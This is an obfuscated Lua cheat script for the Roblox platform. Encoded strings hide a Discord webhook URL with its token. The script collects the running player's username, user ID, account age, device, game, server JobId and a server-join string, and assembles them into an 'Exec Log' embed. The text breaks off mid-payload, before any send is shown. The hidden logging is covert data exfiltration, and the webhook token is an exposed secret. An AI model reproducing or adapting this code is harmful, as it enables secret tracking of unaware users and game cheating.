local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local whscript = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ylhirnEMWGevSzEuGwQgFUfGsXQlAwtOyzUKsNZzjwvcpaQszdacWjbdGVsY2hpZC1qYWlsYnJlYWs=')
local webhookexecUrl = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('QGIxjDGHNJiIrIJhWOfqIVIkbQzFAmwUMQNxdRqaGKbRcuWQgYKauVJaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTMxMjA5MDQzMjQ3NzMzMTU2OC8ycE9XVXlLUGw0TjB6Zll1SXNKVHBTclhQWVRnc2FnSXNCY0FCdndjWDlUemhJa1FYa21ESm5LdHZJS3NmVlRPV0FSLQ==')
local ExecLogSecret = true

local ui = gethui()
local folderName = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('gIerHtmzdvoitYBlBNDaiYwtyrDjGIWKkPTIBjuxIPLKnSGsDUIhqWnc2NyZWVu')
local folder = Instance.new(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('uKwORKdEeFHwvxWTpVQGIZtEtFqdDiVNWEMqujSVpoNGIBKtrIEBywvRm9sZGVy'))
folder.Name = folderName
local player = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('cLyBRAQZlBvSdHDonhAJmULXjKOzYmqBEPRhWKJLMTMUocjnhqbblqOUGxheWVycw==')).LocalPlayer

folder.Parent = gethui()
local players = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ZRUrDXRmZxKvgAjUpHmWQaqwrdLJzOPxFFsxLgpXEjjLUQVCcMjzmHnUGxheWVycw=='))
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('nvXvQbGcQiIvWSJRJhbEVclrVKfjpUqGxKqPpzGLzjgNCgbBwqoUDfNTWFya2V0cGxhY2VTZXJ2aWNl')):GetProductInfo(game.PlaceId).Name
local deviceType = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('htaESuwtritClqcbhacucmGGvKhOqZgKpsjtEHDkYKRTXWSbuoBrMyqVXNlcklucHV0U2VydmljZQ==')):GetPlatform() == Enum.Platform.Windows and yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('IdVUQUeqRmmAdMobmDkPpayxduwOpUgwJcoYCzUDEPJUZUnApTqbtgQUEMg8J+Suw==') or yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('EIlWIdFXBgSJGgdLXZdgxNhJZELtcoJjBSjUrCwAeVMQKRTziBOORhkTW9iaWxlIPCfk7E=')
local snipePlay = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('uKPckcMXNXDrkhmzttPnOxsqZCDmytCYtRXANVRcHncCpHvDYkTGlHoZ2FtZTpHZXRTZXJ2aWNlKA==')TeleportServiceyetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('jCLQYLFygfemwZTZtgvJbMPKVNxtHoMDcFfcXWsMmmKbWDzwqlPmAtfKTpUZWxlcG9ydFRvUGxhY2VJbnN0YW5jZSg=') .. gameid .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('pXeAZnNzBVizVexVZMPrbfHYfZmMsDEeaFUVUjdJMzYSYEdrkGjQKEFLCA=')yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('TdpfMvGgTrdbsdDZMSoWFFZdtJtLqBcghfhEPrkGCgQDMcbafQHpVNiIC4uIGpvYmlkIC4uIA==')yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('OTDNCEkKLPCXTIMWiKItltJpaNqgTbbirUPJNUzPYSMavvscHtUThUmLCBwbGF5ZXIp')
local completeTime = os.date(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('vwrvoPDfjMjQAQAVpHMKiBrGDLnvxnFSpPIUPcHlYnRFwxItExtTjEsJVktJW0tJWQgJUg6JU06JVM='))
local workspace = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('WOVcXyOjfagBoWdFfyYpKrFwWvMcqGRtWSjuSrgemUlbgkqFTiBcBapV29ya3NwYWNl'))
local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
local memoryUsage = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('mcndpWAfiablWigDwqgbJYlFQHwtLGIJrzQoedjISYmcGosbElIzKZlU3RhdHM=')):GetTotalMemoryUsageMb()
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local health = player.Character and player.Character:FindFirstChild(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('vfkDWouEayneFomzINTduoyOJFuUzQfkHxhLqHsiHyYxkIQJupyNkfZSHVtYW5vaWQ=')) and player.Character.Humanoid.Health or yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('UsYRpFIWEMjwlsVgiBOtxPQnLHhyoasoBcnyJXtSUjsmSFNFWIhdAupTi9B')
local maxHealth = player.Character and player.Character:FindFirstChild(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('zuWFCBbPoJDSTUeftnkVqoLjwCmVXUGoBUOvJoVKKSuINiijXhTAcFKSHVtYW5vaWQ=')) and player.Character.Humanoid.MaxHealth or yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ynZegrxgPKavzurycuWrPmpRHhLUwYsdsOrQFIiphIyEQPnKIcSNLLZTi9B')
local position = player.Character and player.Character:FindFirstChild(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KTvbveJgXzFvpcMElQeOjldStehlAgKSQbOpysVIIQHiMraklOpyvGDSHVtYW5vaWRSb290UGFydA==')) and player.Character.HumanoidRootPart.Position or yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('UFiWbHzmeGDSLkpJOIMkdpHaRSQHLMITYmURLFfMhQTzyarGUiGhFaQTi9B')
local gameVersion = game.PlaceVersion

if not ExecLogSecret then
    ExecLogSecret = false
end
if not whscript then
    whscript = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ScfflTeEasJtHnxdoUYAXcTWNteazyIgSAlFeeVeDkLkxkwxypMJjHEUGxlYXNlIHByb3ZpZGUgYSBzY3JpcHQgbmFtZSE=')
end
local commonLoadTime = 5
task.wait(commonLoadTime)
local pingThreshold = 100
local serverStats = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('EemLAnCvMYSRxdKKdglpCLjFwmVLBSqhTshVSzMWzfXfZPOJYKzjBGXU3RhdHM=')).Network.ServerStatsItem
local dataPing = serverStats[yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('NMZbTtbJddgTxcrDnOPMeRYgCROBXzVlNMNIAcSeoAwPaFYgYouWvBFRGF0YSBQaW5n')]:GetValueString()
local pingValue = tonumber(dataPing:match(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('IeyAZWjxDMfVILNshScExkXhEYoCutRqvIVBuMTJJbFNumipTwXZxKdKCVkKyk='))) or yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('yLfoabiRbqGDVErcsIWRbCslevpzGzVOBonwVnunJfbuWchHVcTDlIcTi9B')

local function checkPremium()
    local premium = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('wpxEehIpDezZmfPIhOvndmcQJuRCgIYVpdqyscAMijjYJRElwhSPrWSZmFsc2U=')
    local success, response = pcall(function()
        return player.MembershipType
    end)
    if success then
        if response == Enum.MembershipType.None then
            premium = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('haKDnLEacpygvIvlAdAyiPbfIkPYDnSSLJpoRIGOIiPfTPVGcQHbMFjZmFsc2U=')
        else
            premium = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('VKQaDVNsCggJWPlCLOUOKcYPfALmJNIsBXtFvQwNDxiIglBkBZCCyeadHJ1ZQ==')
        end
    else
        premium = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('lAJTNOWafJQyiIklsoJvlOmFrPkGYNyHfBAGuzuoDxBJXkcztTbftstRmFpbGVkIHRvIHJldHJpZXZlIE1lbWJlcnNoaXA6')
    end
    return premium
end

local premium = checkPremium()

local url = webhookexecUrl

local data = {
    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('dPEhXqzFsLRnkxBcXjkryAyCoSQhsuIplmcsRkDMymDVNHBRKrsWAqIY29udGVudA==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('BCZvRTUAFYuEakkCgvHVGaoggOolpgUIZvJWSvidzYvDEyoNBDmzcjXQGV2ZXJ5b25l'),
    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('XAGheycnofsvRZodAEGMFnByPMAtgNwMfmseOcbpOrYxIVBfUyHHJPeZW1iZWRz')] = {
        {
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('qCfwdfaDDTuOljnWgVAGLSQqlwfEYqCLIcQFzPuRHLVSqxvcqZXtIzAdGl0bGU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('yHFCetgHzTixTHejoBpobLirSiZPewRyVJslxREWFhduAHQorKtUbvd8J+agCAqKlNjcmlwdCBFeGVjdXRpb24gRGV0ZWN0ZWQgfCBFeGVjIExvZyoq'),
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('TXsNLiIMVvOaWytWGxwglhZCEqdUMpxkhqgrOYiRIjOKcltUeSqpNmdZGVzY3JpcHRpb24=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('FVIjRJDGLeNiOCBSNMJMhcZvfahIXirFjwrNfIYiivdNdaCgyqeXkCjKkEgc2NyaXB0IHdhcyBleGVjdXRlZCBpbiB5b3VyIHNjcmlwdC4gSGVyZSBhcmUgdGhlIGRldGFpbHM6Kg=='),
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('RKkliqQiEOOehIMMCvCSvJsYTKxluSnndxCCODsfHydIDkSiNzVIoaPdHlwZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ikesqiubZNaAQLmNVpwrNnvtITfouQRjmbaBuntlWHiaGGwegqtcdRpcmljaA=='),
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('NvnSELQCZrPVbpjDHnSflSQgBtIUoUsEyxkpcFiCZxdTwPLomQHIdzsY29sb3I=')] = tonumber(0x3498db),
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('SObqdGzdGpDeBuhCoAVRqKoaDkVtdnUZhVToWxwvAEcdSzSpxeaiJwzZmllbGRz')] = {
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ovxkBiNHIuqDfyxdraphodhyzVywQXZSlpRwXospVkqmZtDPNeWJrMxbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('oOVrvpKHLukmDRexSVtOtGKMViLHpKvCuhADRKQKjklAuQgFYdThPZB8J+UjSAqKlNjcmlwdCBJbmZvKio='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('qVDxWlGQdMAjVjhKyyvkhYbqzKFzqjvIrhFuYTtDpSrDeWbXKQqyfWcdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('yfuWjwuVIHJuHOKNtOKuypFLVxYXNfXkaoGRiaAxPcpBlCZEIgoRkGC8J+SuyBTY3JpcHQgTmFtZTog') .. whscript .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KfgDsDDonfRcZOaVQJIvgWrNuMZzOVaHnzZIKBqTKUyIAjyIQLmTfMpXG7ij7AgRXhlY3V0ZWQgQXQ6IA==') .. completeTime .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('jMdcQyXWHmdcEUzVGhVstTpjKqsXqGHMDwcsxbUVykMEmcWAzqtBMAuXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('nRyIHvcxNzwtDeJuZPXvzqKOegAequjxvHJzPdbMKmaEPotVuQonaFcaW5saW5l')] = false
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('TPZmLpJtAsIgdgMtMOqMqwOypFKrCwJrcsxsFKbClfUjPZFyXaceDGEbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('oltUhroZCyheDcfBHfEnFGlciSJdvQLbsvtexrOOjHKFabqdqqRzVMU8J+RpCAqKlBsYXllciBEZXRhaWxzKio='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('SnrUmJYmxCAwFTIWPvGYXvEMBJYnFKPrhLdiapHRHYrMruEvmqfCNlDdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('NpGDivCWivHlEtnRxAmYdriIVKVqFhNulwczXBWZcdAMHXcwqNkvsyk8J+nuCBVc2VybmFtZTog') .. player.Name ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('NtmCDoFANmebQHKOqYkIgcQoovbaBmNsrOhaoYBKRZEfPpKAqiChaPSXG7wn5OdIERpc3BsYXkgTmFtZTog') .. player.DisplayName ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('IDtIqppzdOxrwAgcBSwJBwRIuYcPsJLVhlWmtCHYmFiGhtjwiTrwIKRXG7wn4aUIFVzZXJJRDog') .. userid ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('iPuIouEUtSKIlXSIMCcllaVpwQNZSgCBuTtAOuomDQnHJotudvXdteoXG7inaTvuI8gSGVhbHRoOiA=') .. health .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('gWGlMPcPPfwPoRTcsKTXWbKrEtEjpWzpviVTNrGweOApcvRxozWUtDFIC8g') .. maxHealth ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ACwYrZKSSrsUXEpKveGYMcFYEDaGydQckwgRRRLGgDaBzaDQTuESQYxXG7wn5SXIFByb2ZpbGU6IFZpZXcgUHJvZmlsZSAoaHR0cHM6Ly93d3cucm9ibG94LmNvbS91c2Vycy8=') .. userid .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('zwvdfDALCDVpCiiaRADjyvsVsnfsXIHhoPDEGfgQpGnvHbJktIsXgzJL3Byb2ZpbGUpXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('zDQxSDdNniheLNoIybTnvjcKvUJVgGDVNIGnpWKamcEvFHwQoUeRCmDaW5saW5l')] = false
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('CPwOdELjFWxFhbWfhvVoYNmROPCtxxvyILXRBLcAOaPazwGzFdVgsDMbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('mCFJeEglruvKhDDgtxRrGOWVYZGbedyHsEMVJHXLMGjfGTCkLlTKMsE8J+ThSAqKkFjY291bnQgSW5mb3JtYXRpb24qKg=='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('SATuExUUDvgSZgBNLokNNKzEHOhOhbDUgcNABeStwPJtwkHiYRHfQwydmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('DComTnuZTmIaNKUTFxPwcKsXpTLrRrKusSdnxvVHzHKGTJboIWLBrGh8J+Xk++4jyBBY2NvdW50IEFnZTog') .. player.AccountAge .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('jkxHLoqZvvMCyPtTSHQEYHyltSpTWSNXWyzmVzlyVylMNFOzwYSlnnuIGRheXNcbvCfko4gUHJlbWl1bSBTdGF0dXM6IA==') .. premium ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('eKvzKQcfIdNuiuPComUFQbzZTebkZgqbgkunkbXqZeKfVrpTHWKPTLpXG7wn5OFIEFjY291bnQgQ3JlYXRlZDog') .. os.date(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('PkceFFIOzZaRIabZGuoIZRtDmdApqAzYjxzcLFQgxZHyCtuYihJDExRJVktJW0tJWQ='), os.time() - (player.AccountAge * 86400)) .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('cvwGdxIrxczSYLPJnZIZbRGzdtboahFMFsoaiGtIQAtrrRTRdggmoUkXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('eKmKsJqTKMlvfEEBalomfmXIUPPlMgnUVkNEcVeNVoYPUDWQfAvWjIHaW5saW5l')] = false
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('JUxAaOjUTxDJZsrpILBsKVBXcLVRPYbokxPrQKXpUWQztWrvzgNXFJjbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('mJiWAnesVSgdkJGbRlHVqAAuCYMDJaqkQmzkMhMKyqYzljPVwARzkMI8J+OriAqKkdhbWUgRGV0YWlscyoq'),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KKrZJrUEitZIExSfMrCajLJThnyqcwYeEYfvhQVwNIsLznhTzYMGGxEdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('YgXNUyITAAvAdCaYyFmTOJfiMLYuputPEbkQBDTdczWvjmlTHuDeICA8J+Pt++4jyBHYW1lIE5hbWU6IA==') .. gameName ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ayXbIIwqxrFcAbZWkhWrTAKrdxruayUDYcJcOegtURyBYCtVWjqipvGXG7wn4aUIEdhbWUgSUQ6IA==') .. gameid ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('yFMLoOIHzJmfdYhWknWbZOoFauFkzHBiUtWpTESKinkvcYxBsLlGcTDXG7wn5SXIEdhbWUgTGluayAoaHR0cHM6Ly93d3cucm9ibG94LmNvbS9nYW1lcy8=') .. gameid .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('rllrYaIkXOsaqYxDWfGdiafhjcPflOItulRwLJmRvqJEYpZLtCZzFsyKVxu8J+UoiBHYW1lIFZlcnNpb246IA==') .. gameVersion .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('JFGTftKYDXBsRvcLQmRBQJPtNcTnTtptJvTtFzkUHNTHlpOsCEUonHvXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('DOIPzyFgYbypyGEmzdPaPOmafPnITxkHkQRplsYNfTXduBrVAosUokkaW5saW5l')] = false
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('fcUHOXTOVHykQJoJRdDWzBdqnBdAocaYQpCoSQJFVFUGInItgJeofSebmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('QKNhObYVYiauFwJyEwLCbZNHtFXodSQgbBeWMUaattlVJLTmfVPWuKE8J+Vue+4jyAqKlNlcnZlciBJbmZvKio='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('VPIoxPtIzsHvyCsAJkdUbWKMaqQYQevRlvlCUrUWDgOshlLjHjynZLEdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('dCeyaBSNoAbNPDQFvFkMjNVTEsTtZaUdAiCcogeFNrfOQrGrpRDQMzA8J+RpSBQbGF5ZXJzIGluIFNlcnZlcjog') .. playerCount .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('mVgQwozfqcHtxIMtyjgprWopnsJlGQgmaoPLOEwLCmQgdVjnicYcMYSIC8g') .. maxPlayers ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('fUdHpeBhUmpyqGnoaIrPpegpFilpAlESnerLfRezkBhpCgpMqQJHsFSXG7wn5WSIFNlcnZlciBUaW1lOiA=') .. os.date(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('FQkVjAhtrVeeTMJnSYvPYtZgJZaFIbgcbuAzXzhAsFauZYbxipnYBNMJUg6JU06JVM=')) .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('oqIkAuJsEyjtCOvxaKrVAvMnzGYCBPOifpGPHszwzcFrHIqeuEskwAsXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('eQHXOMPinEKYOSnegXDVBnEPUxabRiPsaGAyxyvGIPhoSArbwlZcoaiaW5saW5l')] = true
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ywqlDWvFTclhJmPhBfetthOTRrnPiQKyPehzAWBezCvKBFnsZXXusMtbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('jaWeggCGGSyWPMLQdmwrNQleeResSVphjCknQuwTgaFfJneBvvEgbjs8J+ToSAqKk5ldHdvcmsgSW5mbyoq'),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('CAfSPujmPmuNOJjmJwnyuAFwDysJHvtkyjIoQmQlOTPVaOSNPDgmdlFdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('NvMaKsPHDIzkjLUHkvMYFoPSEjLWmgZMBRceQLDbECIjxzXVPtvHYfG8J+TtiBQaW5nOiA=') .. pingValue .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('hmREoIUAMDBkalvHTwJlnSdSdiTShopsyGGoENUyXMQFRvBVzSkPdnCIG1zXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('rycjLpqQWfMIYBeSXxzqCfqfGJVmHhSMyMFQufWAOeABVHgjentzQCRaW5saW5l')] = true
                },
                {
